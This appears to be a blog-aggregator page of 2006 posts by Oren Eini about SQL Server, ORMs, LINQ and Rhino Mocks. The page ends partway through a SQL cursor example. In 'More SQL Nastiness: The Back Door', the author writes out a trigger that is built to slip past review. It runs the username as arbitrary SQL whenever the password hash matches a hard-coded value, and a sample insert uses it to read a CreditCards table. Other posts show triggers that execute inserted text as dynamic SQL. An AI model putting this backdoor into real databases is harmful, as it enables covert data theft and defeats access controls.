
<!DOCTYPE html>
<html class="scroll-smooth" lang="en-US" data-theme="light">
<head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, shrink-to-fit=no" name="viewport">
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <title>Page 951 â€¢ Relatively General .NET</title>
    <link href="favicon.ico" rel="icon" sizes="any">
    <link href="images/apple-touch-icon.png" rel="apple-touch-icon">
    <meta content="hsl()" name="theme-color">
    <meta content="website" property="og:type">
    <meta content="Home" property="og:title">
    <link rel="stylesheet" href="css/styles.css">
    <link rel="stylesheet" href="pagefind/pagefind-ui.css">
    <!-- Google Analytics -->
    <script>
        // Only load GA if consent is given
        function loadGA() {
            const script = document.createElement('script');
            script.src = 'https://www.googletagmanager.com/gtag/js?id=G-MDFXJY3FCY';
            script.async = true;
            document.head.appendChild(script);

            window.dataLayer = window.dataLayer || [];

            function gtag() {
                dataLayer.push(arguments);
            }

            gtag('js', new Date());
            gtag('config', 'G-MDFXJY3FCY');
        }

        // Check if consent was previously given
        if (localStorage.getItem('cookieConsent') === 'accepted') {
            loadGA();
        }
    </script>
    <!-- End Google Analytics -->
</head>
<body class="mx-auto flex min-h-screen max-w-3xl flex-col bg-bgColor px-4 pt-16 font-mono text-sm font-normal text-textColor antialiased sm:px-8">

<a class="sr-only focus:not-sr-only focus:fixed focus:start-1 focus:top-1.5" href="#main">
    skip to content
</a>
<header class="group relative mb-28 flex items-center sm:ps-[4.5rem]" id="main-header">
    <div class="flex sm:flex-col">
        <a aria-current="page" class="inline-flex items-center hover:filter-none sm:relative sm:inline-block"
           href="index.html">
            <img class="me-3 sm:absolute sm:start-[-4.5rem] sm:me-0 sm:h-16 sm:w-16 w-16" src="images/giphy.gif"
                 alt=""/>
            <span class="text-xl font-bold sm:text-2xl">Relatively General .NET</span>
        </a>
        <nav aria-label="Main menu"
             class="absolute -inset-x-4 top-14 hidden flex-col items-end gap-y-4 rounded-md bg-bgColor/[.85] py-4 text-accent shadow backdrop-blur group-[.menu-open]:z-50 group-[.menu-open]:flex sm:static sm:z-auto sm:-ms-4 sm:mt-1 sm:flex sm:flex-row sm:items-center sm:divide-x sm:divide-dashed sm:divide-accent sm:rounded-none sm:bg-transparent sm:py-0 sm:shadow-none sm:backdrop-blur-none"
             id="navigation-menu">
            <a aria-current="page" class="px-4 py-4 underline-offset-2 sm:py-0 sm:hover:underline"
               href="index.html"> Home </a><a
                class="px-4 py-4 underline-offset-2 sm:py-0 sm:hover:underline" href="/about/">
                About </a>
        </nav>
    </div>
    <site-search class="ms-auto" id="search">
        <button id="open-search"
                class="flex h-9 w-9 items-center justify-center rounded-md ring-zinc-400 transition-all hover:ring-2"
                data-open-modal="">
            <svg aria-label="search" class="h-7 w-7" fill="none" height="16" stroke="currentColor"
                 stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" viewBox="0 0 24 24" width="16"
                 xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0h24v24H0z" stroke="none"></path>
                <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path>
            </svg>
        </button>
        <dialog aria-label="search"
                class="h-full max-h-full w-full max-w-full border border-zinc-400 bg-bgColor shadow backdrop:backdrop-blur sm:mx-auto sm:mb-auto sm:mt-16 sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md">
            <div class="dialog-frame flex flex-col gap-4 p-6 pt-12 sm:pt-6">
                <button id="close-search"
                        class="ms-auto cursor-pointer rounded-md bg-zinc-200 p-2 font-semibold dark:bg-zinc-700"
                        data-close-modal="">Close
                </button>
                <div class="search-container">
                    <div id="cactus__search"/>
                </div>
            </div>
        </dialog>
    </site-search>
    <theme-toggle class="ms-2 sm:ms-4">
        <button id="theme-toggle" class="relative h-9 w-9 rounded-md p-2 ring-zinc-400 transition-all hover:ring-2"
                type="button">
            <span class="sr-only">Dark Theme</span>
            <svg aria-hidden="true"
                 class="absolute start-1/2 top-1/2 h-7 w-7 -translate-x-1/2 -translate-y-1/2 scale-100 opacity-100 transition-all dark:scale-0 dark:opacity-0"
                 fill="none" focusable="false" id="sun-svg" stroke-width="1.5" viewBox="0 0 24 24"
                 xmlns="http://www.w3.org/2000/svg">
                <path
                    d="M12 18C15.3137 18 18 15.3137 18 12C18 8.68629 15.3137 6 12 6C8.68629 6 6 8.68629 6 12C6 15.3137 8.68629 18 12 18Z"
                    stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                <path d="M22 12L23 12" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                <path d="M12 2V1" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                <path d="M12 23V22" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                <path d="M20 20L19 19" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                <path d="M20 4L19 5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                <path d="M4 20L5 19" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                <path d="M4 4L5 5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                <path d="M1 12L2 12" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
            <svg aria-hidden="true"
                 class="absolute start-1/2 top-1/2 h-7 w-7 -translate-x-1/2 -translate-y-1/2 scale-0 opacity-0 transition-all dark:scale-100 dark:opacity-100"
                 fill="none" focusable="false" id="moon-svg" stroke="currentColor" stroke-width="1.5"
                 viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M0 0h24v24H0z" fill="none" stroke="none"></path>
                <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path>
                <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path>
                <path d="M19 11h2m-1 -1v2"></path>
            </svg>
        </button>
    </theme-toggle>
    <mobile-button>
        <button aria-expanded="false" aria-haspopup="menu" aria-label="Open main menu"
                class="group relative ms-4 h-7 w-7 sm:invisible sm:hidden" id="toggle-navigation-menu" type="button">
            <svg aria-hidden="true"
                 class="absolute start-1/2 top-1/2 h-full w-full -translate-x-1/2 -translate-y-1/2 transition-all group-aria-expanded:scale-0 group-aria-expanded:opacity-0"
                 fill="none" focusable="false" id="line-svg" stroke="currentColor" stroke-width="1.5"
                 viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M3.75 9h16.5m-16.5 6.75h16.5" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
            <svg aria-hidden="true"
                 class="absolute start-1/2 top-1/2 h-full w-full -translate-x-1/2 -translate-y-1/2 scale-0 text-accent opacity-0 transition-all group-aria-expanded:scale-100 group-aria-expanded:opacity-100"
                 fill="none" focusable="false" id="cross-svg" stroke="currentColor" stroke-width="1.5"
                 viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M6 18L18 6M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"></path>
            </svg>
        </button>
    </mobile-button>
</header>
<main id="main" data-pagefind-body>
    <section aria-label="Blog post list">
        <article id="article-9501">
            <a href="https://ayende.com/blog/986/the-value-of-legacy-projects" target="_blank">
                <h2 class="title mb-6" id="article-9501">The value of Legacy Projects</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 09, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">At worst, you will learn what not to do.</p>
        </article>
        <article id="article-9502">
            <a href="https://ayende.com/blog/985/rhino-mocks-2-5-9" target="_blank">
                <h2 class="title mb-6" id="article-9502">Rhino Mocks 2.5.9</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 09, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">My name is Ayende Rahien, I&#x27;m a software developer, it has been five days since I last release a version, but I can&#x27;t hold myself anymore.    Yes! A new release for Rhino Mocks, with better support for method with array of value type arguments. I would like to thank to J.H.L. van de Pol for sending the patches and for converting to Rhino Mocks.     You can get the new bits and the source here.    Now I need a new feature for Rhino Mocks so I can bump the version number to 2.6&#xA0;and avoid the problem of a two digit minor release number. I have some ideas, but I would like to hear more from you.</p>
        </article>
        <article id="article-9503">
            <a href="https://ayende.com/blog/984/nasty-sql-part-3" target="_blank">
                <h2 class="title mb-6" id="article-9503">Nasty SQL: Part 3</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 09, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">I realized that I didn&#x27;t really explain why anyone would ever need this nastiness, the idea is piping dynamic SQL inside the database. I realize that this doesn&#x27;t really mean anything, so here is the example. First, we need to expand our nasty trigger to support multiply statements:            CREATE TABLE Nasty( [text] nvarchar(500));                        GO                        CREATE TRIGGER Very_Nasty_Trigger                                 ON NASTY                                 INSTEAD OF INSERT                        AS BEGIN                        &#xA0;&#xA0;&#xA0; DECLARE @stmt nvarchar(500);                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; DECLARE statements CURSOR                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; FOR select [text] from INSERTED;                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; OPEN statements                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; FETCH NEXT FROM statements                                 &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; INTO @stmt                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; WHILE @@FETCH_STATUS != -1                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; BEGIN                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; exec sp_executesql @stmt                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; FETCH NEXT FROM statements                                 &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; INTO @stmt                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; END                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; CLOSE statements                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; DEALLOCATE statements                        END        Now we can use it to find out stuff about our database using the InformationSchema tables, like so:            INSERT INTO Nasty([text])                        SELECT &#x27;SELECT COUNT(*), &#x27;&#x27;&#x27;&#x2B;table_name&#x2B;&#x27;&#x27;&#x27; FROM &#x27;&#x2B;table_name FROM information_schema.tables        This is quick and dirty way to find out how much rows there are in each of your tables. Ten points to the first person who can recognize where similar technqiue is widely used.</p>
        </article>
        <article id="article-9504">
            <a href="https://ayende.com/blog/983/more-sql-nastiness-the-back-door" target="_blank">
                <h2 class="title mb-6" id="article-9504">More SQL Nastiness: The Back Door</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 09, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">Continuing on the theme of&#xA;the nasty trigger from the previous post, here is the Back Door Trigger, let&#x2019;s&#xA;see what happens when a nefarious (rather then just nasty) programmer has thoughts&#xA;about leaving himself a back door into an application, take a look at this, how&#xA;long does it take to see what is wrong here?&#xA;&#xA;&#xA0;&#xA;&#xA;CREATE Table Users&#xA;(&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; user name&#xA;nvarchar(50),&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; password varbinary(10)&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; --&#xA;more data&#xA;);&#xA;&#xA;GO&#xA0;&#xA0;&#xA0; &#xA;CREATE TRIGGER HashPassword ON Users INSTEAD OF INSERT&#xA;AS BEGIN&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; DECLARE @password varbinary(10),&#xA;@username nvarchar(50)&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SET @username = (SELECT user name from inserted)&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SET @password = (SELECT HashBytes(&#x27;SHA&#x27;,inserted.password) from&#xA;inserted)&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; if (@password&#xA;=&#xA;0x939A115E3DCD7C4D2764)&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; exec sp executesql @username&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; else&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; INSERT INTO Users(user name, password) VALUES(@username, @password)&#xA;END&#xA;&#xA;&#xA0;&#xA;&#xA;This is a near invisible&#xA;back door to do whatever you want in the system. This would go through stored&#xA;procs and any other security mechanism that you&#x2019;ve in place like smoke. I&#xA;think that this will most probably pass through most code reviews and security&#xA;inspections without being noticed. For extra points, implement your own&#xA;HashWithSalt() function that will be used on the corresponding view which will&#xA;do the same for selection.&#xA;&#xA;&#xA0;&#xA;&#xA;INSERT INTO Users(user name, password) VALUES(&#x27;SELECT * from CreditCards&#x27;, &#x27;1=0&#x27;);&#xA;&#xA;&#xA0;&#xA;&#xA;You&#x2019;ve better start&#xA;shopping.</p>
        </article>
        <article id="article-9505">
            <a href="https://ayende.com/blog/982/what-im-missing-in-sql-server-management-studio" target="_blank">
                <h2 class="title mb-6" id="article-9505">What I&#x27;m missing in SQL Server Management Studio</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 09, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">Here is a list of the things that I really need. Just to&#xA;clarify, I am working on a large&#xA;database. I waste a ton of time just finding&#xA;stuff in the UI.&#xA;&#xA;&#xA0;&#xA;&#xA;&#xA; Grouping items in&#xA;     the UI according to a certain naming convention (regular expression would&#xA;     be great) .&#xA; Quick find by the&#xA;     name of the object (and an option to script it to the query window).&#xA; A way to disable the&#xA;     (very slow) UI from popping up all the time with pretty tables / graphs,&#xA;     and just get the SQL.</p>
        </article>
        <article id="article-9506">
            <a href="https://ayende.com/blog/981/nasty-sql-idea" target="_blank">
                <h2 class="title mb-6" id="article-9506">Nasty SQL Idea</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 09, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">If I ever catch someone actually doing it, there would be hell to pay, but here is a new level of&#xA;nastiness in SQL:&#xA;&#xA;&#xA0;&#xA;&#xA;CREATE TABLE Nasty( [text] nvarchar(500));&#xA;&#xA;CREATE TRIGGER Very Nasty Trigger ON&#xA0; NASTY INSTEAD OF INSERT&#xA;&#xA;AS BEGIN&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Declare&#xA;@stmt nvarchar(max)&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SET&#xA;@stmt = (select [text] from INSERTED);&#xA;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; exec&#xA;sp executesql @stmt&#xA;END&#xA;&#xA;&#xA0;&#xA;&#xA;Usage: INSERT INTO NASTY([TEXT]) VALUES(&#x27;SELECT 56&#x27;);&#xA;&#xA;&#xA0;&#xA;&#xA;The result of this query is&#xA;56, but it can do pretty much anything it wants. I&#x2019;ll post later with the&#xA;nastier query. This one is just the start. I&#x2019;m seeing something (not as&#xA;advanced) too much right now.</p>
        </article>
        <article id="article-9507">
            <a href="https://ayende.com/blog/980/on-the-nature-of-beauty" target="_blank">
                <h2 class="title mb-6" id="article-9507">On the nature of beauty</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 08, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">I had a very long post ready about the nature of beauty, code and perl poetry, I canned that and will just note that it&#x27;s much better to work of beautiful things than normal ones.    Case in point: I was working on a power point presentation, and when I merely selected a slide design that I like, I felt much better and was much more willing to complete the task then when I was staring at the boring black on white.</p>
        </article>
        <article id="article-9508">
            <a href="https://ayende.com/blog/979/comparing-linq-and-its-contemporaries" target="_blank">
                <h2 class="title mb-6" id="article-9508">Comparing LINQ and Its Contemporaries</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 08, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">Ted Neward has an article at MSDN&#xA0;about Linq (Microsoft next generation data accress layer / ORM) and the rest of the tools that are out there in the field for data acess. I agree with most of the article, and I was excited as any when I first saw Linq (can you imagine walking to a client and telling him that this is The Microsoft way to do so, instead of having them insist on datasets?).    The problem that I have is that it make some broad generalizations about the rest of the tools, more spesficailly, on N/Hibernate. To be spesific, this quote:Unfortunately, because Hibernate, JDO 2 and EJB 3 all sit &quot;on top&quot; of the language as written, they suffer from many of the same problems as all automated mapping tools do: attempts to hide data retrieval strategies behind object interfaces, which goes hand in hand with attempts to model relationships between tables in the data store with relationships between objects, and an inability to address strongly typed &quot;partial object&quot; queries being two of the major problems.    There are so many things that I&#x27;ve a problem here that I&#x27;ve a hard time to know where to start.            &quot;... attempts to hide data retrieval strategies behind object interfaces ...&quot; - Yes, and? That is the whole point of an ORM, I don&#x27;t want&#xA0; to know about the data retrieval strategy. I do want to be able to say &quot;give me Ayende&#x27;s Blog and all the posts from december&quot; without caring how this is done.            &quot;... attempts to model relationships between tables in the data store with relationships between objects ...&quot; - I call bull on this one. I wrote a highly complex business model that had very little to do with the underlying database structure. I was neither constrained nor force to change my model for the database, or the other way around.            &quot;... an inability to address strongly typed &quot;partial object&quot; queries ...&quot; - I&#x27;m not sure what he is talking about here, but in my project, there is one place where I used strings to expressed a query, and that was because what I needed could not be expressed without the type semantics of the CLR.    The only thing that Linq has is that they same guys that write the programming languages are writing it. I can guarantee that NHibernate will take advantage of those features before long, and there are similar implementation to Linq right now, in db4o&#xA0;products. The rest of the problems he specified which was the select N &#x2B; 1 and loading large amounts of data can be solved by any ORM that I know of, and they will be a problem for Linq as well.    I used to be a pretty heavy C&#x2B;&#x2B; guy, I loved reading and writing template heavy code, playing with pointers, playing as close to the hardware as it is possible in modern OS. Then I met the CLR, and I realize that I could be far more productive if I didn&#x27;t have to think about memory handling all the time. That is not to say that I can afford not to think about it, it just mean that I don&#x27;t need to be aware of the implications of each and every line of code (anyone can recall the lessons about what can cause exceptions and what can&#x27;t?). Beyond an integer assignment, I think that anything could, and you needed to be aware of that and be sure to release memory. That is without talking about buffer overflows or segmentation fault.    I feel the same way about ORM. I know SQL, I think that it is a great language to do all sort of cool stuff (most of which I&#x27;m currently finding out about), but I don&#x27;t think that it has a place in a business application. ORM frees you to work on a business concerns, no on the details of my data access strategy. Like in the GC, you can&#x27;t really ignore it, but it gets the data out of your way. When you need to optimize, it&#x27;s very easy to do so. I managed to take a page from 91 queries per page view to just 3 (and I don&#x27;t think that I could have gone down to less than 2 if I tried hard) in a few hours.I consider an ORM as important to developing business applications as a Garbage Collection is.</p>
        </article>
        <article id="article-9509">
            <a href="https://ayende.com/blog/978/moving-from-procedural-code-to-sets-part-2" target="_blank">
                <h2 class="title mb-6" id="article-9509">Moving from procedural code to sets: Part 2</h2>
            </a>
            <p class="mb-2">by Oren Eini</p>
            <p class="mb-6 flex gap-1.5">
                    <span>
                        <svg width="1.25rem" fill="currentColor" viewBox="0 0 24 24"
                             xmlns="http://www.w3.org/2000/svg"><path
                                xmlns="http://www.w3.org/2000/svg"
                                d="M12 4C7.58172 4 4 7.58172 4 12C4 16.4183 7.58172 20 12 20C16.4183 20 20 16.4183 20 12C20 7.58172 16.4183 4 12 4ZM2 12C2 6.47715 6.47715 2 12 2C17.5228 2 22 6.47715 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12ZM12 6C12.5523 6 13 6.44772 13 7V11.5858L15.7071 14.2929C16.0976 14.6834 16.0976 15.3166 15.7071 15.7071C15.3166 16.0976 14.6834 16.0976 14.2929 15.7071L11.2929 12.7071C11.1054 12.5196 11 12.2652 11 12V7C11 6.44772 11.4477 6 12 6Z"></path></svg>
                    </span>
                posted on: January 08, 2006
            </p>
            <p class="max-w-full w-full line-clamp-5 text-justify mb-20">In the previous post&#xA0;I showed how it is possible to use aggerate functions to avoid procedural code in SQL. The result of this post actually surprised me, since I didn&#x27;t know that this was possible until I tried it (I intended to show that this is not possible, and then show another way). As an aside, looking into the results of both queries, the cursor based one was wrong by several thousands, because of data type conversions that were happening (losing precision from numeric to money, mostly).     Well, I still want show how to do it in more complex statements, but I&#x27;m having trouble of thinking of a problem simple enough to explain that cannot be solved better, as I showed yesterday. So, let&#x27;s go back to my mythological Payments table, which now looks like this:                                                                                                                        Amount                                            To                                            Payments                                            Date                                                                            626.329                                            Gas                                            23                                            7/1/06                                                                            794.995                                            Food&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;                                            10                                            7/1/06                                                                            296.007                                            Drink&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;                                            20                                            7/1/06                                            The table contains 1,000,000 rows, and has no indexing / primak keys whatsoever.    Here is another contrived example, which now will also calculate the average amount of a single payment, as well as the total number of single payments:            DECLARE                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; @current_amount money,                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; @current_NumOfPayments int,                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; @total money,                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; @tmp money,                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; @avg money,                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; @count NUMERIC                                &#xA0;                        DECLARE big_payments CURSOR                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; FOR SELECT amount,NumOfPayments FROM Payments                                &#xA0;                        SET @total = 0                        SET @count = 0                                &#xA0;                        OPEN big_payments                                &#xA0;                        FETCH NEXT FROM                        &#xA0;&#xA0;&#xA0;&#xA0; big_payments INTO @current_amount, @current_NumOfPayments                                &#xA0;                        WHILE @@FETCH_STATUS != -1                        BEGIN                                &#xA0;                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0; IF (@current_NumOfPayments IS NOT NULL AND @current_NumOfPayments &lt;&gt; 0)                        &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; SET @tmp = @current_amount/@current_NumOfPayments&#xA0;&#xA0;&#xA0;                        